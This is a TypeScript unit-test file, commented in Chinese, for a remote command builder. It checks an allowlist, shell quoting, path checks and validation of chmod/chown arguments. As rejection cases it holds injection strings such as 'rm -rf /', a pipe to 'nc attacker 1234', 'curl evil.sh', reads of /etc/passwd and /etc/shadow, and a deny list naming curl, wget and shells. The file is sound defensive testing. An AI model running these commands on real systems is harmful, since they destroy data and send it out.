/**
 * B08 的 T08.1 / T08.2 验收点：命令白名单补全 + 参数校验 + **注入样例全部被拦**。
 *
 * 用例按**攻击面**组织（与 B07 同思路，但补上 B08 新增的三类参数）：
 * - 命令名注入（非白名单程序、分隔符拼接、管道）
 * - 命令替换（反引号 / `$(`）—— 且要区分"引号内是字面量"
 * - 路径逃逸与引号截断
 * - **非路径参数**：八进制权限位、UID/GID 整数
 *
 * 同时覆盖本批次修掉的两个问题：
 * 1. 朴素切分把引号内的 `;` 当分隔符 → 合法路径被误拒（改引号感知）
 * 2. 写探针以前手拼字符串且不做路径校验（改走模板 + 退出码）
 */
import { describe, expect, it } from 'vitest'
import {
  ALLOWED_COMMANDS,
  MAX_ID_VALUE,
  UnsafeCommandError,
  assertCommandAllowed,
  assertIdNumber,
  assertModeBits,
  buildChmodCommand,
  buildChownCommand,
  buildCommandVCommand,
  buildDfCommand,
  buildHashCheckCommand,
  buildHomeCommand,
  buildUnameCommand,
  buildWriteProbeCommand,
  parseDfOutput,
  quoteRemotePath,
  splitShellSegments
} from '@main/infra/remote-exec'
import { ErrorCode } from '@main/infra/errors'

/* ------------------------------------------------------------ 白名单本身 */

describe('ALLOWED_COMMANDS（T08.1）', () => {
  it('包含方案书 §8.3 的整张表', () => {
    for (const cmd of [
      'uname',
      'command',
      'printf',
      'cd',
      'sha256sum',
      'shasum',
      'df',
      'chmod',
      'chown',
      'test'
    ]) {
      expect(ALLOWED_COMMANDS as readonly string[], `缺少 ${cmd}`).toContain(cmd)
    }
  })

  it('仍然没有文件操作与解释器（文件操作必须走 SFTP）', () => {
    for (const forbidden of [
      'rm',
      'mv',
      'cp',
      'cat',
      'dd',
      'sh',
      'bash',
      'python3',
      'curl',
      'wget',
      'echo',
      'tee',
      'install'
    ]) {
      expect(ALLOWED_COMMANDS as readonly string[], `不该有 ${forbidden}`).not.toContain(forbidden)
    }
  })
})

/* ---------------------------------------------------------------- df */

describe('buildDfCommand（T08.1）', () => {
  it('用 -Pk：POSIX 单行输出 + 固定 1024 字节单位', () => {
    expect(buildDfCommand('/opt/app')).toBe("df -Pk '/opt/app'")
  })

  it('路径先规范化再过引号', () => {
    expect(buildDfCommand('/opt/app//dist/')).toBe("df -Pk '/opt/app/dist'")
  })

  it('拒绝路径逃逸、换行与相对路径', () => {
    for (const bad of ['/opt/../etc', '/opt/a\nwhoami', 'relative', '/', '', '/opt/a\0']) {
      expect(() => buildDfCommand(bad), `应拒绝：${JSON.stringify(bad)}`).toThrow(UnsafeCommandError)
    }
  })

  it('生成的命令能过出口自检', () => {
    expect(() => assertCommandAllowed(buildDfCommand('/opt/app'))).not.toThrow()
  })
})

describe('parseDfOutput（纯逻辑，解析错了会误判磁盘空间）', () => {
  const SAMPLE = [
    'Filesystem     1024-blocks     Used Available Capacity Mounted on',
    '/dev/vda1         41922560 12345678  25345678      33% /'
  ].join('\n')

  it('解析出可用空间并换算成字节（-k 是 1024 字节块）', () => {
    const r = parseDfOutput(SAMPLE)
    expect(r).not.toBeNull()
    expect(r?.availableBytes).toBe(25345678 * 1024)
    expect(r?.usedBytes).toBe(12345678 * 1024)
    expect(r?.totalBytes).toBe((12345678 + 25345678) * 1024)
    expect(r?.filesystem).toBe('/dev/vda1')
    expect(r?.mountPoint).toBe('/')
  })

  it('挂载点含空格时整段保留（不能只取第 6 列）', () => {
    const out = [
      'Filesystem     1024-blocks     Used Available Capacity Mounted on',
      '/dev/sdb1         10485760  1048576   9437184      11% /data/my app'
    ].join('\n')
    expect(parseDfOutput(out)?.mountPoint).toBe('/data/my app')
  })

  it('折行残行不会被当数据行（-P 本不该折行，这里只保证不误读）', () => {
    // 若设备名折行，续行只有 5 列（缺设备名），列序与正常 6 列不同。
    // 与其猜测，不如判为"探测失败" —— 误读列会让"空间充足"判断错到离谱。
    const out = ['/dev/mapper/long-device-name', '65536 1 65535 1% /mnt/x'].join('\n')
    expect(parseDfOutput(out)).toBeNull()
  })

  it('只有表头 / 空输出 / 报错文本 → null（调用方必须当"探测失败"处理）', () => {
    const header = 'Filesystem     1024-blocks     Used Available Capacity Mounted on'
    for (const input of [
      header,
      '',
      '   ',
      'df: /nope: No such file or directory',
      'df: invalid option',
      'garbage\nwith\nlines'
    ]) {
      expect(parseDfOutput(input), `应返回 null：${JSON.stringify(input)}`).toBeNull()
    }
  })

  it('非字符串输入不抛错，返回 null', () => {
    expect(parseDfOutput(undefined as unknown as string)).toBeNull()
    expect(parseDfOutput(null as unknown as string)).toBeNull()
  })

  it('多行数据取最后一条（df 只对一个路径答一行；多余行说明有异常）', () => {
    const out = [
      '/dev/vda1  100 10 90 10% /',
      '/dev/vdb1  200 20 180 10% /data'
    ].join('\n')
    expect(parseDfOutput(out)?.filesystem).toBe('/dev/vdb1')
  })
})

/* ---------------------------------------------------------- 权限位 / 属主 */

describe('assertModeBits（T08.2）', () => {
  it('接受 3 位与 4 位八进制', () => {
    for (const ok of ['644', '755', '600', '0644', '0755', '4755', '1777', '0000']) {
      expect(assertModeBits(ok)).toBe(ok)
    }
  })

  it('拒绝一切注入与畸形形态', () => {
    for (const bad of [
      '755; rm -rf /',
      '755 && whoami',
      '755|id',
      '755 /etc/passwd',
      'abc',
      '999', // 9 不是八进制
      '88',
      '75',
      '075555',
      '',
      ' 755',
      '755 ',
      '-755',
      '+755',
      '755\n',
      '0o755',
      '0x1ff',
      '$(id)',
      '`id`',
      '7 5 5',
      'n755',
      '755\t'
    ]) {
      expect(() => assertModeBits(bad), `应拒绝：${JSON.stringify(bad)}`).toThrow(UnsafeCommandError)
    }
  })

  it('拒绝非字符串（数字 755 也不行 —— 会丢掉前导 0）', () => {
    expect(() => assertModeBits(755 as unknown as string)).toThrow(UnsafeCommandError)
    expect(() => assertModeBits(undefined as unknown as string)).toThrow(UnsafeCommandError)
  })
})

describe('assertIdNumber（T08.2）', () => {
  it('接受非负整数（数字与字符串两种来源）', () => {
    expect(assertIdNumber(0, 'uid')).toBe('0')
    expect(assertIdNumber('0', 'uid')).toBe('0')
    expect(assertIdNumber(1000, 'uid')).toBe('1000')
    expect(assertIdNumber('4294967295', 'gid')).toBe('4294967295')
  })

  it('拒绝负数、浮点、进制前缀、符号、空白与超限', () => {
    for (const bad of ['-1', '-0', '1e3', '0x10', '1.5', '+0', '', ' 1', '1 ', '1\n', '01 0', '1_000']) {
      expect(() => assertIdNumber(bad, 'uid'), `应拒绝：${JSON.stringify(bad)}`).toThrow(
        UnsafeCommandError
      )
    }
    expect(() => assertIdNumber(String(MAX_ID_VALUE + 1), 'uid')).toThrow(UnsafeCommandError)
    expect(() => assertIdNumber('99999999999', 'uid')).toThrow(UnsafeCommandError)
    expect(() => assertIdNumber(undefined as unknown as string, 'uid')).toThrow(UnsafeCommandError)
    expect(() => assertIdNumber(null as unknown as string, 'uid')).toThrow(UnsafeCommandError)
    expect(() => assertIdNumber(Number.NaN, 'uid')).toThrow(UnsafeCommandError)
    expect(() => assertIdNumber(Number.POSITIVE_INFINITY, 'uid')).toThrow(UnsafeCommandError)
  })
})

describe('buildChmodCommand / buildChownCommand（T08.1）', () => {
  it('正常形态', () => {
    expect(buildChmodCommand({ mode: '644', path: '/opt/app/x.jar' })).toBe(
      "chmod 644 '/opt/app/x.jar'"
    )
    expect(buildChownCommand({ uid: 1000, gid: 1000, path: '/opt/app' })).toBe(
      "chown 1000:1000 '/opt/app'"
    )
    expect(() => assertCommandAllowed(buildChmodCommand({ mode: '755', path: '/opt/app' }))).not.toThrow()
    expect(() =>
      assertCommandAllowed(buildChownCommand({ uid: '0', gid: '0', path: '/opt/app' }))
    ).not.toThrow()
  })

  it('坏的权限位 / 属主在拼命令前就被拦下（不会走到线上）', () => {
    expect(() => buildChmodCommand({ mode: '644; id', path: '/opt/app' })).toThrow(
      UnsafeCommandError
    )
    expect(() => buildChownCommand({ uid: '0:0', gid: '0', path: '/opt/app' })).toThrow(
      UnsafeCommandError
    )
    expect(() => buildChownCommand({ uid: '0', gid: '$(id)', path: '/opt/app' })).toThrow(
      UnsafeCommandError
    )
  })

  it('路径里的单引号被转义，且能过出口自检', () => {
    const cmd = buildChmodCommand({ mode: '600', path: "/opt/it's here" })
    expect(cmd).toBe("chmod 600 '/opt/it'\\''s here'")
    expect(() => assertCommandAllowed(cmd)).not.toThrow()
  })

  it('拒绝的是 E_PATH_UNSAFE，便于上层区分', () => {
    try {
      buildChmodCommand({ mode: '600', path: '/opt/../etc' })
      expect.unreachable()
    } catch (err) {
      expect((err as UnsafeCommandError).code).toBe(ErrorCode.E_PATH_UNSAFE)
    }
  })
})

describe('buildWriteProbeCommand（T03.7 写探针，B08 收口）', () => {
  it('用 test -w 且只用退出码表达结果（不引入 echo）', () => {
    const cmd = buildWriteProbeCommand('/opt/app')
    expect(cmd).toBe("test -w '/opt/app'")
    expect(cmd).not.toContain('echo')
    expect(() => assertCommandAllowed(cmd)).not.toThrow()
  })

  it('旧实现能逃逸的换行路径现在被拒', () => {
    // 旧代码：`test -w '${p.replace(/'/g, "'\\''")}' && echo yes || echo no`
    // 未做 assertSafeRemotePath，`/opt/a\nrm -rf /` 会截断引号
    expect(() => buildWriteProbeCommand('/opt/a\nrm -rf /')).toThrow(UnsafeCommandError)
  })

  it('含单引号与分号的路径经转义后是安全的（不该被误拒）', () => {
    // 这条是"引号转义确实管用"的正面证据：分号落在单引号内，shell 不解释
    const cmd = buildWriteProbeCommand("/opt/a' ; id ; '")
    expect(cmd).toBe("test -w '/opt/a'\\'' ; id ; '\\'''")
    expect(() => assertCommandAllowed(cmd)).not.toThrow()
  })
})

/* ------------------------------------------------------------ 出口自检 */

describe('splitShellSegments（引号感知切分）', () => {
  it('跳过单引号内部的分隔符', () => {
    const segs = splitShellSegments("df -Pk '/opt/a;b|c&d'")
    expect(segs).toHaveLength(1)
    expect(segs[0].raw).toBe("df -Pk '/opt/a;b|c&d'")
  })

  it('按顶层分隔符切段，成对的 || 与 && 只算一个', () => {
    expect(splitShellSegments('cd /a && sha256sum -c /m').map((s) => s.raw)).toEqual([
      'cd /a ',
      ' sha256sum -c /m'
    ])
    expect(splitShellSegments('a || b').map((s) => s.raw)).toEqual(['a ', ' b'])
    expect(splitShellSegments('a | b; c').map((s) => s.raw)).toEqual(['a ', ' b', ' c'])
  })

  it('引号骨架只保留引号外的文本（用于查命令替换）', () => {
    const [seg] = splitShellSegments("df -Pk '/opt/$(id)'")
    expect(seg.raw).toContain('$(id)')
    expect(seg.unquotedSkeleton).toBe('df -Pk ')
  })

  it('按 POSIX 规则处理转义：引号外的 \\ 转义下一个字符', () => {
    // 这是 quoteShellArg 生成的 `'\''` 形态，必须数对引号
    const segs = splitShellSegments("chmod 600 '/opt/it'\\''s here'")
    expect(segs).toHaveLength(1)
  })

  it('引号不配平直接拒绝', () => {
    expect(() => splitShellSegments("df -Pk '/opt/a")).toThrow(UnsafeCommandError)
  })
})

describe('assertCommandAllowed（出口自检，B08 起为收口点）', () => {
  const allTemplates = (): string[] => [
    buildUnameCommand(),
    buildHomeCommand(),
    buildCommandVCommand('shasum'),
    buildHashCheckCommand({ tool: 'sha256sum', cwd: '/opt/a', manifestPath: '/opt/b' }),
    buildDfCommand('/opt/a'),
    buildChmodCommand({ mode: '755', path: '/opt/a' }),
    buildChownCommand({ uid: '0', gid: '0', path: '/opt/a' }),
    buildWriteProbeCommand('/opt/a')
  ]

  it('放行本文件生成的所有命令', () => {
    for (const c of allTemplates()) {
      expect(() => assertCommandAllowed(c), `应放行：${c}`).not.toThrow()
    }
  })

  it('拒绝非白名单程序开头的命令段', () => {
    for (const bad of [
      'rm -rf /',
      'echo hi',
      'df -Pk /tmp; rm -rf /',
      "cd '/opt' && cat /etc/passwd",
      '/bin/sh -c "id"',
      'df -Pk /tmp | nc attacker 1234',
      'chmod 777 /etc/shadow && curl evil.sh'
    ]) {
      expect(() => assertCommandAllowed(bad), `应拒绝：${bad}`).toThrow(UnsafeCommandError)
    }
  })

  it('拒绝引号外的命令替换，但放行引号内的字面量', () => {
    expect(() => assertCommandAllowed('sha256sum -c `whoami`')).toThrow(UnsafeCommandError)
    expect(() => assertCommandAllowed('sha256sum -c $(id)')).toThrow(UnsafeCommandError)
    expect(() => assertCommandAllowed('df -Pk /tmp$(id)')).toThrow(UnsafeCommandError)
    // 引号内 shell 不展开，是合法数据（例如路径里真的有 $() ）：
    // 误拒会变成"某些合法路径永远用不了"的假告警
    expect(() => assertCommandAllowed("df -Pk '/opt/$(id)'")).not.toThrow()
    expect(() => assertCommandAllowed("df -Pk '/opt/`id`'")).not.toThrow()
  })

  it('引号内的分隔符不再被误判为注入（B08 修正）', () => {
    for (const p of ['/opt/a;b', '/opt/a|b', '/opt/a&&b', '/opt/a&b']) {
      expect(() => assertCommandAllowed(buildDfCommand(p)), `应放行：${p}`).not.toThrow()
    }
  })

  it('拒绝空命令、空白命令与含空字符的命令', () => {
    expect(() => assertCommandAllowed('')).toThrow(UnsafeCommandError)
    expect(() => assertCommandAllowed('   ')).toThrow(UnsafeCommandError)
    expect(() => assertCommandAllowed('uname\0-s')).toThrow(UnsafeCommandError)
  })
})

/* ----------------------------------------------------- 既有行为的回归 */

describe('B07 行为回归', () => {
  it('quoteRemotePath 仍然拒绝逃逸与换行', () => {
    for (const bad of ['/opt/../etc', '/etc\nrm -rf /', 'relative/path', '/', '', '/opt/app\0']) {
      expect(() => quoteRemotePath(bad)).toThrow(UnsafeCommandError)
    }
  })

  it('hash 校验命令仍不加 --status（保留逐文件明细）', () => {
    expect(
      buildHashCheckCommand({ tool: 'sha256sum', cwd: '/opt/p', manifestPath: '/tmp/m.sha256' })
    ).toBe("cd '/opt/p' && sha256sum -c '/tmp/m.sha256'")
  })
})
